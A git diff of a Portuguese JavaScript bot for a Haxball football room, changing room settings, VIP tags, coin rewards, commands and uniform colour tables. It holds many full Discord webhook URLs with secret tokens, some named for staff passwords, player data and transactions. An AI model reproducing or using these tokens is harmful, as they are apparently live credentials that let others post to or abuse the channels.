@@ -1,132 +1,62 @@
 var testMode = false; // Caso for testar alguma novidade na sala, defina como "true". Caso contrário deixe "false".
-var modeRoom = "flash"; // Defina como "flash" ou "normal" para o tempo/score da sala serem reformulados automaticamente
-var roomName; 
+var modeRoom = "normal"; // Defina como "flash" ou "normal" para o tempo/score da sala serem reformulados automaticamente
+var roomName;
 var maxPlayers;
 var publicRoom;
 var timeLimit;
 var scoreLimit;
-let capitão = false;
+var capitão = false;
 var vipTag = "";
-var puskasTag = "";
-var goldBallTag = "";
 var urls;
-var discord = 'https://discord.gg/5WCAazCH';
+var auto;
+var discord = 'https://discord.gg/qpUmFtUaEZ';
+var traco = '---------------------------------';
+var sorteioIniciado = false;
+var daysSorteios = 0;
+var maxSorteios = 3;
+var lastExecutedDate = null;
+var garcomTag = "";
+var luvaOuroTag = "";
+var chuteiraOuroTag = "";
+var puskasTag = "";
+var buskasTag = "";
+var goldBallTag = "";
+var currentVipValue = 0;
+var vipTimeoutId;
 
-var puskasTagSetting = `🏆 [ PUSKÁS ] 🏆`;
-var goldBallTagSetting = `⚽ [ BOLA DE OURO ] ⚽`;
+var chuteiraOuroTagSetting = ` [ 🥇 | Chuteira de ouro ] `;
+var luvaOuroTagSetting = ` [ 🥇 | Luva de ouro ] `;
+var garcomTagSetting = ` [ 🥓 | Garçom ] `;
+var puskasTagSetting = ` [ 🏆 | Puskás ] `;
+var buskasTagSetting = ` [ 🥅 | Buskás ] `;
+var goldBallTagSetting = ` [ ⚽ | Bola de ouro ] `;
 
-urls = {
-    flash: {
-        gameWebhook: `https://discord.com/api/webhooks/1141540370832953444/PZOvPBrtRME3ZU4ZE9y4rPbpsm6U5sej7iU6X4HmxGgwiQ2Eq4T6SdIPhdsdkBP2huaQ`,
-        callAdminWebhook: `https://discord.com/api/webhooks/1143366723387539468/LV-bY33QY_B-IuU72cWkVXrVW5te-gBLnIS-QYo1WC0o5JV4pjPhEAB3m9I8NwWjfW7n`,
-        passwordStaffWebhook: `https://discord.com/api/webhooks/1141133930058227835/6N_BPuKQo4RbMXgJ4Stq29l0d1mM-g5sD3Juzx_-6k0slNUS_FHxy3HV-7OWMCzqIZs-`,
-        passwordModWebhook: `https://discord.com/api/webhooks/1156054153781579858/xpM_ptv0rVDRxOiYIwUkQKLrm3ZOe-I35SRTVHUkGAVaBogJuZ4lesYAVaLZtKuXrpN2`,
-        passwordVipWebhook: `https://discord.com/api/webhooks/1140992048871264257/2XNzkmOuylC2WoYtENkxDowRzHFCmDdkJqKPUgXof_Wkr5BdgZWsYLB5niDvE07pQQWu`,
-        roomLogChat: `https://discord.com/api/webhooks/1142105465111707838/NQ7QKa1ZffKFRDijxyR7HITEHf9ePkBmlHnw8KaD620Ee8GZJ5ED_04uQpCpotAiSQDj`,
-        replayLog: `https://discord.com/api/webhooks/1141540370832953444/PZOvPBrtRME3ZU4ZE9y4rPbpsm6U5sej7iU6X4HmxGgwiQ2Eq4T6SdIPhdsdkBP2huaQ`,
-        errorsWebhook: `https://discord.com/api/webhooks/1154404440288276500/Sa4uF1Lv8VwqZVyKWyr7VqAmBJuSIrHLQwF2uNn0DLYoCCK2-_6CxPf-N3-Yoqs3QXbI`,
-        entradas: `https://discord.com/api/webhooks/1154404622698557460/-DkNFRP0htTGGZ3__lqO7GIwF4XXILWERiBcpo-FK33ClrPX9-DOA-J5YUkHi-PgodLD`,
-        saidas: `https://discord.com/api/webhooks/1154404710279811205/bAuJBHAqQFjDCtHNCEzUQFn-NHOZYAGiuZkZuqkI9EeevAbF6aYOSOcaz7yhiqW36CJ1`,
-        allWebhook: `https://discord.com/api/webhooks/1154415064632266822/41EdWb7KwVv7nDuQ8AoAIfpCtnaNsh62FkASDYIvoKMK0o_DWkZJAPFQW09-yemUAThI`
-    },
-    normal: {
-        gameWebhook: `https://discord.com/api/webhooks/1141188895644594337/QExKU3VftgZ5afNVWZFMnwpKPEzNG4Xo10CawfKUFOhqsO4SWq5qkwbUBEuJP9IX5_CJ`,
-        callAdminWebhook: `https://discord.com/api/webhooks/1143366723387539468/LV-bY33QY_B-IuU72cWkVXrVW5te-gBLnIS-QYo1WC0o5JV4pjPhEAB3m9I8NwWjfW7n`,
-        passwordStaffWebhook: `https://discord.com/api/webhooks/1141133930058227835/6N_BPuKQo4RbMXgJ4Stq29l0d1mM-g5sD3Juzx_-6k0slNUS_FHxy3HV-7OWMCzqIZs-`,
-        passwordModWebhook: `https://discord.com/api/webhooks/1156054153781579858/xpM_ptv0rVDRxOiYIwUkQKLrm3ZOe-I35SRTVHUkGAVaBogJuZ4lesYAVaLZtKuXrpN2`,
-        passwordVipWebhook: `https://discord.com/api/webhooks/1140992048871264257/2XNzkmOuylC2WoYtENkxDowRzHFCmDdkJqKPUgXof_Wkr5BdgZWsYLB5niDvE07pQQWu`,
-        roomLogChat: `https://discord.com/api/webhooks/1154420864138350623/AlH9VPwgWvrsl1YYhfSKmqZfkTbdDL_y1zRjCG8Ekxue26LYXJoB_G9fQwO0zXZtKzel`,
-        replayLog: `https://discord.com/api/webhooks/1141188895644594337/QExKU3VftgZ5afNVWZFMnwpKPEzNG4Xo10CawfKUFOhqsO4SWq5qkwbUBEuJP9IX5_CJ`,
-        errorsWebhook: `https://discord.com/api/webhooks/1154404440288276500/Sa4uF1Lv8VwqZVyKWyr7VqAmBJuSIrHLQwF2uNn0DLYoCCK2-_6CxPf-N3-Yoqs3QXbI`,
-        entradas: `https://discord.com/api/webhooks/1154404622698557460/-DkNFRP0htTGGZ3__lqO7GIwF4XXILWERiBcpo-FK33ClrPX9-DOA-J5YUkHi-PgodLD`,
-        saidas: `https://discord.com/api/webhooks/1154404710279811205/bAuJBHAqQFjDCtHNCEzUQFn-NHOZYAGiuZkZuqkI9EeevAbF6aYOSOcaz7yhiqW36CJ1`,
-        allWebhook: `https://discord.com/api/webhooks/1154415064632266822/41EdWb7KwVv7nDuQ8AoAIfpCtnaNsh62FkASDYIvoKMK0o_DWkZJAPFQW09-yemUAThI`
-    }
-};
+var coinsCs = 5;
+var coinsGoal = 5;
+var coinsWinner = 3;
+var coinsAssis = 3;
 
-if (testMode === true) {
-    roomName = "TESTE";
-    publicRoom = false;
-    maxPlayers = 5;
-} else {
-    roomName = "VorteX 🌀 | Flash | 3x3";
-    publicRoom = true;
-    maxPlayers = 30;
-}
+var messageBlocks = {};
+var ignoreCommands = ["!chatoff", "!chaton"];
 
-if (modeRoom === "flash") {
-    timeLimit = 1;
-    scoreLimit = 1;
+var ignoreSetMessages = [
+    "Você não pode ignorar suas próprias mensagens",
+    " foi ignorado com sucesso. Você não verá mais suas mensagens.",
+    "Esse jogador já está sendo ignorado.",
+    "Não há nenhum jogador com o ID fornecido."
+];
+var ignoreRemovalMessages = [
+    "Essa operação não pode ser executada em si mesmo.",
+    "O status de ignorar de  foi removido. Agora você pode ver suas mensagens.",
+    "Esse jogador não está na sua lista de ignorados.",
+    "Não há nenhum jogador com o ID fornecido."
+];
 
-    let flashUrls = Object.assign({}, urls.flash);
-    urls = flashUrls;
-} else if (modeRoom === "normal") {
-    timeLimit = 3;
-    scoreLimit = 3;
+var ignoreMessageSets = [ignoreSetMessages, ignoreRemovalMessages];
 
-    let normalUrls = Object.assign({}, urls.normal);
-    urls = normalUrls;
-}
-
-var room = HBInit({
-    roomName: roomName,
-    maxPlayers: maxPlayers,
-    public: publicRoom,
-    noPlayer: true,
-    token: '',
-    geo: { "lat": -23.5335, "lon": -46.6359, "code": "br" }
-});
-
-var vipNames = {
-    1: `⚔️|𝙑𝙞𝙥 𝘼𝙡𝙥𝙝𝙖`,
-    2: `🌌|𝙑𝙞𝙥 𝐆𝐚𝐥𝐚𝐜𝐭𝐢𝐜𝐨`,
-    3: `🔥 |𝙑𝙞𝙥 𝙎𝙪𝙥𝙧𝙚𝙢𝙤`,
-    4: `😈|𝙑𝙞𝙥 𝐕𝐨𝐫𝐭𝐞𝐗`,
-}
-
-var tagsNames = {
-    goldBall: `[ ⚽| Bola de ouro ] `,
-    puskas: `[ 🏆| Puskás]`
-}
-
-var config = {
-    flash: {
-        cargos: {
-            fundador: `👑 [ 𝘿𝙤𝙣𝙤 ]`,
-            adminOficial: `🌌 [ Admin oficial ]`,
-            administrador: `🌌 [ 𝘼𝙙𝙢𝙞𝙣 ]`,
-            moderador: `🌌 [ Moderador ]`
-        },
-        frases: {
-            noPermission: `Você não tem permissão para utilizar este comando.`,
-            errorCommand: `Ocorreu um erro ao executar este comando...`
-        }
-    },
-    normal: {
-        cargos: {
-            fundador: `👑 [ 𝘿𝙤𝙣𝙤 ]`,
-            adminOficial: `🌌 [ Admin oficial ]`,
-            administrador: `🌌 [ 𝘼𝙙𝙢𝙞𝙣 ]`,
-            moderador: `🌌 [ Moderador ]`
-        },
-        frases: {
-            noPermission: `Você não tem permissão para utilizar este comando.`,
-            errorCommand: `Ocorreu um erro ao executar este comando...`
-        }
-    }
-};
-// Bot desenvolvido pelo OBL
-var authbanida = []; //  auth banida
-var connbanida = []; //  conn banida
-var ipbanido = []; //  ip banida
-var nomebanido = []; //  nome banida
-
-var banidosstorage = JSON.parse(localStorage.getItem("banidos")) || [];
-var banidos = banidosstorage[0] || {}
-
-
-const dadosjogadoresstorage = JSON.parse(localStorage.getItem("dadosjogadores")) || []; //  Busca dados dos jogadores
-var dadosjogadores = dadosjogadoresstorage[0] || {}
+var colors2 = [0xFFFF00, 0x00FF00, 0xFFFF00, 0xFF0000, 0xFFFFFF, 0x97FFFF];
+var fonts = ["bold", "bold", "bold", "bold", "bold", "bold"];
+var sounds = [2, 1, 2, 2, 1, 1];
 
 const cores = {
     amarelo: 0xFFFF00,
@@ -149,13 +79,102 @@ const cores = {
     ciano: 0x00FFFF
 };
 
-var commandStatNameTranslation = {
-    jogos: "games",
-    vitorias: "wins",
-    gols: "goals",
-    assistencias: "assists",
-    cs: "cs"
+urls = {
+    flash: {
+        gameWebhook: `https://discord.com/api/webhooks/1141540370832953444/PZOvPBrtRME3ZU4ZE9y4rPbpsm6U5sej7iU6X4HmxGgwiQ2Eq4T6SdIPhdsdkBP2huaQ`,
+        callAdminWebhook: `https://discord.com/api/webhooks/1143366723387539468/LV-bY33QY_B-IuU72cWkVXrVW5te-gBLnIS-QYo1WC0o5JV4pjPhEAB3m9I8NwWjfW7n`,
+        passwordStaffWebhook: `https://discord.com/api/webhooks/1141133930058227835/6N_BPuKQo4RbMXgJ4Stq29l0d1mM-g5sD3Juzx_-6k0slNUS_FHxy3HV-7OWMCzqIZs-`,
+        passwordModWebhook: `https://discord.com/api/webhooks/1156054153781579858/xpM_ptv0rVDRxOiYIwUkQKLrm3ZOe-I35SRTVHUkGAVaBogJuZ4lesYAVaLZtKuXrpN2`,
+        passwordVipWebhook: `https://discord.com/api/webhooks/1140992048871264257/2XNzkmOuylC2WoYtENkxDowRzHFCmDdkJqKPUgXof_Wkr5BdgZWsYLB5niDvE07pQQWu`,
+        roomLogChat: `https://discord.com/api/webhooks/1142105465111707838/NQ7QKa1ZffKFRDijxyR7HITEHf9ePkBmlHnw8KaD620Ee8GZJ5ED_04uQpCpotAiSQDj`,
+        replayLog: `https://discord.com/api/webhooks/1141540370832953444/PZOvPBrtRME3ZU4ZE9y4rPbpsm6U5sej7iU6X4HmxGgwiQ2Eq4T6SdIPhdsdkBP2huaQ`,
+        errorsWebhook: `https://discord.com/api/webhooks/1154404440288276500/Sa4uF1Lv8VwqZVyKWyr7VqAmBJuSIrHLQwF2uNn0DLYoCCK2-_6CxPf-N3-Yoqs3QXbI`,
+        entradas: `https://discord.com/api/webhooks/1154404622698557460/-DkNFRP0htTGGZ3__lqO7GIwF4XXILWERiBcpo-FK33ClrPX9-DOA-J5YUkHi-PgodLD`,
+        saidas: `https://discord.com/api/webhooks/1154404710279811205/bAuJBHAqQFjDCtHNCEzUQFn-NHOZYAGiuZkZuqkI9EeevAbF6aYOSOcaz7yhiqW36CJ1`,
+        allWebhook: `https://discord.com/api/webhooks/1154415064632266822/41EdWb7KwVv7nDuQ8AoAIfpCtnaNsh62FkASDYIvoKMK0o_DWkZJAPFQW09-yemUAThI`,
+        dados: "https://discord.com/api/webhooks/1146937088554569780/rm-3FkuwpeEqvwuffwZOoIq4vOL5gLlras73H5mgAb1i-1CM_b4kHdmcbg_iIl_9jt7b",
+        transacoes: `https://discord.com/api/webhooks/1175614412904738917/Jzuw_gyldmKdY0x39nwdjGYqfTsG0zrgdhR2HWCBsahRFsBA6OiPM9ECvIKlt_f6ocDJ`
+    },
+    normal: {
+        gameWebhook: `https://discord.com/api/webhooks/1141188895644594337/QExKU3VftgZ5afNVWZFMnwpKPEzNG4Xo10CawfKUFOhqsO4SWq5qkwbUBEuJP9IX5_CJ`,
+        callAdminWebhook: `https://discord.com/api/webhooks/1143366723387539468/LV-bY33QY_B-IuU72cWkVXrVW5te-gBLnIS-QYo1WC0o5JV4pjPhEAB3m9I8NwWjfW7n`,
+        passwordStaffWebhook: `https://discord.com/api/webhooks/1141133930058227835/6N_BPuKQo4RbMXgJ4Stq29l0d1mM-g5sD3Juzx_-6k0slNUS_FHxy3HV-7OWMCzqIZs-`,
+        passwordModWebhook: `https://discord.com/api/webhooks/1156054153781579858/xpM_ptv0rVDRxOiYIwUkQKLrm3ZOe-I35SRTVHUkGAVaBogJuZ4lesYAVaLZtKuXrpN2`,
+        passwordVipWebhook: `https://discord.com/api/webhooks/1140992048871264257/2XNzkmOuylC2WoYtENkxDowRzHFCmDdkJqKPUgXof_Wkr5BdgZWsYLB5niDvE07pQQWu`,
+        roomLogChat: `https://discord.com/api/webhooks/1154420864138350623/AlH9VPwgWvrsl1YYhfSKmqZfkTbdDL_y1zRjCG8Ekxue26LYXJoB_G9fQwO0zXZtKzel`,
+        replayLog: `https://discord.com/api/webhooks/1141188895644594337/QExKU3VftgZ5afNVWZFMnwpKPEzNG4Xo10CawfKUFOhqsO4SWq5qkwbUBEuJP9IX5_CJ`,
+        errorsWebhook: `https://discord.com/api/webhooks/1154404440288276500/Sa4uF1Lv8VwqZVyKWyr7VqAmBJuSIrHLQwF2uNn0DLYoCCK2-_6CxPf-N3-Yoqs3QXbI`,
+        entradas: `https://discord.com/api/webhooks/1154404622698557460/-DkNFRP0htTGGZ3__lqO7GIwF4XXILWERiBcpo-FK33ClrPX9-DOA-J5YUkHi-PgodLD`,
+        saidas: `https://discord.com/api/webhooks/1154404710279811205/bAuJBHAqQFjDCtHNCEzUQFn-NHOZYAGiuZkZuqkI9EeevAbF6aYOSOcaz7yhiqW36CJ1`,
+        allWebhook: `https://discord.com/api/webhooks/1154415064632266822/41EdWb7KwVv7nDuQ8AoAIfpCtnaNsh62FkASDYIvoKMK0o_DWkZJAPFQW09-yemUAThI`,
+        dados: "https://discord.com/api/webhooks/1146937088554569780/rm-3FkuwpeEqvwuffwZOoIq4vOL5gLlras73H5mgAb1i-1CM_b4kHdmcbg_iIl_9jt7b",
+        transacoes: `https://discord.com/api/webhooks/1175614412904738917/Jzuw_gyldmKdY0x39nwdjGYqfTsG0zrgdhR2HWCBsahRFsBA6OiPM9ECvIKlt_f6ocDJ`
+    }
 };
+
+
+if (testMode === true) {
+    roomName = "TESTE";
+    publicRoom = false;
+    maxPlayers = 30;
+    timeLimit = 0;
+    scoreLimit = 1;
+} else {
+    if (modeRoom === "flash") {
+        timeLimit = 1;
+        scoreLimit = 1;
+
+        roomName = "VorteX 🌀 | Flash | 3x3";
+        publicRoom = true;
+        maxPlayers = 30;
+
+        let flashUrls = Object.assign({}, urls.flash);
+        urls = flashUrls;
+    } else if (modeRoom === "normal") {
+        timeLimit = 3;
+        scoreLimit = 3;
+
+        roomName = "VorteX 🌀 | Normal | 3x3";
+        publicRoom = true;
+        maxPlayers = 30;
+
+        let normalUrls = Object.assign({}, urls.normal);
+        urls = normalUrls;
+    }
+}
+
+var room = HBInit({
+    roomName: roomName,
+    maxPlayers: maxPlayers,
+    public: publicRoom,
+    noPlayer: true,
+    token: '',
+    geo: { "lat": -19.81, "lon": -43.95, "code": "br" }
+});
+
+var vipNames = {
+    1: ` ⚔️ | 𝙑𝙞𝙥 𝘼𝙡𝙥𝙝𝙖 `,
+    2: ` 🌌 | 𝙑𝙞𝙥 𝐆𝐚𝐥𝐚𝐜𝐭𝐢𝐜𝐨 `,
+    3: ` 🔥 | 𝙑𝙞𝙥 𝙎𝙪𝙥𝙧𝙚𝙢𝙤 `,
+    4: ` 😈 | 𝙑𝙞𝙥 𝐕𝐨𝐫𝐭𝐞𝐗 `,
+}
+
+var config = {
+    cargos: {
+        fundador: ` [ 👑 Fundador ] `,
+        dono: ` [ 👑 𝘿𝙤𝙣𝙤 ] `,
+        gerente: `[ 🔰 Gerente ] `,
+        administrador: `[ 🌌 𝘼𝙙𝙢𝙞𝙣 ] `,
+        Admin: `[ 🌌 𝘼𝙙𝙢𝙞𝙣-temp ] `,
+        moderador: ` [ 🌌 Moderador ] `,
+    },
+    frases: {
+        noPermission: `Você não tem permissão para utilizar este comando.`,
+        errorCommand: `Ocorreu um erro ao executar este comando...`
+    }
+};
+
+var blacklist = [];
 
 var statNameTranslation = {
     'games': 'Jogos',
@@ -165,15 +184,54 @@ var statNameTranslation = {
     'assist': 'Assistencias',
     'ownGoals': 'Gols Contras',
 }
+var commandStatNameTranslation = {
+    jogos: "games",
+    vitorias: "wins",
+    gols: "goals",
+    assistencias: "assists",
+    cs: "cs"
+};
 
-let provocacoes = '!ali, !arn, !atk, !band, !bnh, !bnh2, !bnh3, !cag, !calc, !cham, !chu, !cff, !cru, !dboa, !dboa2, !def, !dig, !dmr, !faz, !fal, !fé, !fe, !fran, !fran2, !frio, !fru, !gira, !glç, !grl, !gol, !hum, !ini, !lad, !lç,  !mar,  !olho, !olhu, !pç, !pick, !pint, !pip, !proi, !ptz, !qdf, !qbl, !qjo, !qgo, !qse, !rcl, !rpz, !rvz, !sai, !sac, !sap, !sdg, !ski, !siu, !taf, !tira, !tnc, !ui, !ui2, !uu, !vira, !volt, !vl, !x, !zag, !zen, !divisao, !quentin, !logica, !base, !meto2, !boa, !bai, !bag, !bike, !bch, !bpa, !brb, !cal, !fome, !fds, !jlu, !itk, !fzl, !gen, !kk, !lae, !mal, !mal2, !mal3, !mds, !nice, !trave, !puskas, !bolso, !pika, !papai, !seupai, !peganunca, !quentin2, !izi, !piden, !qsl, !system, !oi, !toma, !ifood, !chute, !moscou, !chora, !red, !blue, !paired, !paiblue, !pegala, !perdoa, !perdoa2, !receba, !meto, !pega, !toca2, !toca, !gk, !gk2, !gk3, !gk4, !gk5, !bobiu, !oe'
+let playerConnections = new Map();
+let playerAuth = new Map();
+let playerIpv4 = new Map();
 
-let categorias = 'Categorias de uniformes: !selecoes, !brasileiros, !outros, !estrangeiros, !especiais,' // Bot desenvolvido pelo OBL
-let selecoes = 'Seleções: !bra, !ale, !arg, !hol, !eua, !fra, !por, !egi, !uru, !ru, !marro, !mona, !esp, !ara, !afeg, !alb, !argé, !mex, !csul, !croa'
-let brasileiros = 'Obs: Alguns unis possuem até 3 opções, exemplo: !bah, !bah2, !bah3\nSérie A: !cam, !cap, !amg,  !bah, !bot, !cor, !corit, !cru, !cui, !fla, !flu, !fort, !goi, !int, !gre, !pal, !brag, !san, !sp, !vas\nSérie B: !sam, !cha, !rec, !vit, !cea, !abc, !ava, !vila, !lond, !itu, !acg, !tom, !botsp, !crb, !cri, !gua, !juv, !mir, !nov, !pont\nSérie C: !pay, !csa, !mana, !alt, !ama, !ame, !apa, !botpb, !bru, !conf, !fig, !flo, !nau, !ope, !pou, !rem, !sb, !sj, !vr, !ypi\nSérie D: !trem, !tocan, !santc, !glo, !alago, !brasil, !andre, !ferro, !brapel'
-let outros = 'Outros: !pr, !ibis, !loud, !lsg, !c9, !furia, !fx' // Bot desenvolvido pelo OBL
-let estrangeiros = 'Estrangeiros: !mcy, !bay, !intm, !mil, !chel, !bar, !rm, !boru, !liv, !psg, !bdm, !juve, !alhi, !alah, !alna, !bj, !inde, !pen, !riv, !tig, !atl, !estre, !feye, !estu, !olim, !raci, !vele, !ars'
-let especiais = 'Ranks: !bronze, !prata, !ouro, !diamante'
+var provocacoes = '!ali, !arn, !atk, !band, !bnh, !bnh2, !bnh3, !cag, !calc, !cham, !chu, !cff, !cru, !dboa, !dboa2, !def, !dig, !dmr, !faz, !fal, !fé, !fe, !fran, !fran2, !frio, !fru, !gira, !glç, !grl, !gol, !hum, !ini, !lad, !lç,  !mar,  !olho, !olhu, !pç, !pick, !pint, !pip, !proi, !ptz, !qdf, !qbl, !qjo, !qgo, !qse, !rcl, !rpz, !rvz, !sai, !sac, !sap, !sdg, !ski, !siu, !taf, !tira, !tnc, !ui, !ui2, !uu, !vira, !volt, !vl, !x, !zag, !zen, !divisao, !quentin, !logica, !base, !meto2, !boa, !bai, !bag, !bike, !bch, !bpa, !brb, !cal, !fome, !fds, !jlu, !itk, !fzl, !gen, !kk, !lae, !mal, !mal2, !mal3, !mds, !nice, !trave, !puskas, !bolso, !pika, !papai, !seupai, !peganunca, !quentin2, !izi, !piden, !qsl, !system, !oi, !toma, !ifood, !chute, !moscou, !chora, !red, !blue, !paired, !paiblue, !pegala, !perdoa, !perdoa2, !receba, !meto, !pega, !toca2, !toca, !gk, !gk2, !gk3, !gk4, !gk5, !bobiu, !oe, !sab, !obl, !seco, !pato, !mb, !sor, !can, !flo, !frz, !zap, !tro, !cus, !nof, !pas, !bir, !pipoca, !imp, !tan, !gol2, !ret, !vem, !lixe, !noj, !inc, !banho, !thigas, !obl, !obl2, !berg, !berg2, !lgbt';
+var categorias = 'Categorias de uniformes: !selecoes, !brasileiros, !outros, !estrangeiros, !vipuni'
+var selecoes = 'Seleções: !bra, !ale, !arg, !hol, !eua, !fra, !por, !egi, !uru, !ru, !marro, !mona, !esp, !ara, !afeg, !alb, !argé, !mex, !csul, !croa'
+var brasileiros = 'Obs: Alguns unis possuem até 3 opções, exemplo: !bah, !bah2, !bah3\nSérie A: !cam, !cap, !amg,  !bah, !bot, !cor, !corit, !cru, !cui, !fla, !flu, !fort, !goi, !int, !gre, !pal, !brag, !san, !sp, !vas\nSérie B: !sam, !cha, !rec, !vit, !cea, !abc, !ava, !vila, !lond, !itu, !acg, !tom, !botsp, !crb, !cri, !gua, !juv, !mir, !nov, !pont\nSérie C: !pay, !csa, !mana, !alt, !ama, !ame, !apa, !botpb, !bru, !conf, !fig, !flo, !nau, !ope, !pou, !rem, !sb, !sj, !vr, !ypi\nSérie D: !trem, !tocan, !santc, !glo, !alago, !brasil, !andre, !ferro, !brapel'
+var outros = 'Outros: !pr, !ibis'
+var estrangeiros = 'Estrangeiros: !mcy, !bay, !intm, !mil, !chel, !bar, !rm, !boru, !liv, !psg, !bdm, !juve, !alhi, !alah, !alna, !bj, !inde, !pen, !riv, !tig, !atl, !estre, !feye, !estu, !olim, !raci, !vele, !ars'
+var vipuni = 'Vips: !xesn, !gg, !wp, !sev, !two, !on, !faz, !faz2, !faz3, !faz4'
+var novos = `- Brasileiros: !pal, !pal2, !pal3, !san, !fla, !sp, !sp2, !brag, !brag2, !brag3, !flu2, !flu3, !corit, !corit2, !corit3, !inter2, !inter3, !gre2, !gre3, !amg, !amg2, !fort, !fort2, !ami, !ami2, !ami3, !cru, !cru2, !cru3 
+    - Estrangeiros: !colo, !olim, !bolivar, !alll, !emlc, !oncds, !dtar, !atn, !sl, !lus, !defj
+    - Outros: !alain, !mazb, !rajs`;
+
+var uniVIP = {
+    '!xesn': [0, 0xFFFFFF, [0x000000, 0xFF9305, 0x000000]],
+    '!gg': [60, 0xF7F7F7, [0xC2C2C2, 0xA8A8A8, 0x8C8C8C]],
+    '!wp': [60, 0x82FFFF, [0x0CBDC9, 0x0A9EA8, 0x07757D]],
+    '!sev': [50, 0x9C971A, [0x292929, 0x141414, 0x080808]],
+    '!two': [50, 0x000000, [0xCE93FC, 0xA173C4, 0x7E5A99]],
+    '!on': [0, 0x15FF0D, [0x000000]],
+    '!faz': [60, 0xFF5D52, [0XFF0000, 0XCC0000, 0XA10000]],
+    '!faz2': [60, 0xA39043, [0xFFE169, 0xE6CB5F, 0xD9C059]],
+    '!faz3': [60, 0x295BFF, [0x1600D4, 0x1200B3, 0x0F0091]],
+    '!faz4': [90, 0xD1FFBD, [0xD69004, 0x16960D, 0xD10000]]
+};
+
+var uniVIP2 = {
+    '!vip1': {
+        1: [0, 0xFFFFFF, [0x000000, 0xFF9305, 0x000000]],
+        2: [60, 0xF7F7F7, [0xC2C2C2, 0xA8A8A8, 0x8C8C8C]],
+        3: [60, 0x82FFFF, [0x0CBDC9, 0x0A9EA8, 0x07757D]]
+    },
+    '!vip2': {
+        1: [90, 0xD1FFBD, [0xD69004, 0x16960D, 0xD10000]],
+        2: [60, 0x295BFF, [0x1600D4, 0x1200B3, 0x0F0091]],
+        3: [0, 0x15FF0D, [0x000000]]
+    },
+}
 
 var uniList = {
     //Selecoes
@@ -193,7 +251,7 @@ var uniList = {
     '!fra2': [90, 0xFFB94F, [0x000959]],
     '!fra3': [0, 0x05009E, [0x000061, 0xFFFFFF, 0xFF0800]],
     '!por': [-45, 0xFFF700, [0x165200, 0xC20808]],
-    '!por2': [90, 0xFFFF00, [0xF00000]], // Bot desenvolvido pelo OBL
+    '!por2': [90, 0xFFFF00, [0xF00000]],
     '!por3': [90, 0xEB0000, [0xFFFFFF]],
     '!egi': [60, 0xFFFFFF, [0xF70000]],
     '!egi2': [60, 0x000000, [0xFFFFFF]],
@@ -216,52 +274,64 @@ var uniList = {
     '!croa': [0, 0xFF0022, [0x000000, 0x061219, 0x000000]], //Croacia
 
     //Série A
-    '!sp': [0, 0x000000, [0x900000, 0xFFFFFF, 0x000000]],
-    '!sp2': [90, 0xFF0000, [0xFFFFFF]],
+    '!sp': [90, 0x261815, [0xE81E1E, 0xFFFFFF, 0x3A2720]], // São Paulo 1
+    '!sp2': [0, 0x242020, [0x000000, 0xFBFAFF, 0xFF171F]], // São Paulo 2
+    '!sp3': [90, 0xFD1B3F, [0xF2F2FA, 0x0B0A11]], // São Paulo 3
     '!cap': [45, 0xFAFAFA, [0xC90000, 0x000000, 0xC90000]],
     '!cap2': [40, 0xFFFFFF, [0x8B0B0A, 0x1D1D1D, 0x8B0B0A]],
     '!cap3': [40, 0xB4332D, [0xC4C7CE, 0x0E111A, 0xC4C7CE]],
     '!cap4': [240, 0xFFFFFF, [0x0C0A0F, 0x19161D]],
     '!cam': [0, 0xFF0000, [0x000000, 0xFFFFFF, 0x000000]],
-    '!bah': [0, 0xFAFAFA, [0x2908FF, 0xFF0000, 0x2908FF]], //bahia
-    '!bah2': [0, 0xFFFFFF, [0x03173C, 0xA51B28, 0x03173C]], // Bot desenvolvido pelo OBL
-    '!bah3': [40, 0xFFEDDB, [0x21A3D5, 0x21A3D5, 0xBFC0C2]],
-    '!fla': [90, 0xFFFFFF, [0xFF0000, 0x000000, 0xFF0000]],
-    '!fla2': [90, 0xF5F5F5, [0x000000, 0xA61100, 0x000000]],
+    '!bah': [60, 0xFFFFFF, [0x60B0C7, 0x5CA4C7]], // Bahia 1
+    '!bah2': [0, 0xFFFFFF, [0x03173C, 0xA51B28, 0x03173C]], // Bahia 2
+    '!bah3': [40, 0xFFEDDB, [0x21A3D5, 0x21A3D5, 0xBFC0C2]], // Bahia 3
+    '!fla': [90, 0xC52D26, [0x353637, 0x292A2B]], // Flamengo 1
+    '!fla2': [90, 0xF5F5F5, [0x000000, 0xA61100, 0x000000]], // Flamengo 2
     '!cui': [90, 0xFFFFFF, [0xF8F23C, 0x06783C, 0xF8F23C]], //cuiaba
     '!cui2': [60, 0x007F35, [0xEDEEF0, 0xFBDC05, 0xEDEEF0]],
     '!cui3': [60, 0xFFEC7A, [0x60D07A, 0x419D46]],
-    '!cru': [90, 0x000000, [0x1515B0]],
-    '!cru2': [0, 0xFFFFFF, [0x0600A6]],
-    '!cru3': [60, 0xFFFFFF, [0x0063C4, 0x0063C4, 0x0063C4]],
-    '!cor': [90, 0x292929, [0xFAFAFA]],
-    '!cor2': [90, 0xFFFFFF, [0x1b1c1e]],
-    '!corit': [0, 0x0C3B00, [0xFFFFFF, 0x039420, 0xFFFFFF]],
-    '!fort': [90, 0xFAFAFA, [0x0B2CBD, 0xD61020, 0x0B2CBD]],
-    '!vas': [53, 0xFF0000, [0xFAFAFA, 0x000000, 0xFAFAFA]],
-    '!vas2': [53, 0xFF0000, [0x000000, 0xFAFAFA, 0x000000]],
-    '!pal': [53, 0xFFFFFF, [0x1D3825]], //palmeiras
-    '!pal2': [60, 0x05504C, [0xFFFFFF]],
-    '!pal3': [60, 0xEFDD21, [0x7EE3AB]],
-    '!pal4': [0, 0xFFFFFD, [0x466329, 0xF0F0F2, 0x466329]],
-    '!brag': [0, 0xFF0000, [0xFAFAFA]],
+    '!cru': [90, 0xFFFFFF, [0x3C37DB]], // Cruzeiro 1
+    '!cru2': [60, 0x00478F, [0xFAFAFA, 0xFAFAFA]], // Cruzeiro 2
+    '!cru3': [0, 0x002383, [0xFAD900, 0xFFDB00]], // Cruzeiro 3
+    '!cor': [90, 0x292929, [0xFAFAFA]], // Corinthians 1
+    '!cor2': [90, 0xFFFFFF, [0x1b1c1e]], // Corinthians 2
+    '!corit': [90, 0x2E2E2E, [0x25705C, 0xF8F8F8, 0x25705C]], // Coritiba 1
+    '!corit2': [0, 0x1B3534, [0x01524B, 0xFFFFFF, 0x01524B]], // Coritiba 2
+    '!corit3': [90, 0xE7E4E7, [0x0F0000, 0x194E4A]], // Coritiba 3
+    '!fort': [45, 0xFFFFFF, [0xB8CBE5, 0x022063, 0xB8CBE5]], // Fortaleza 1
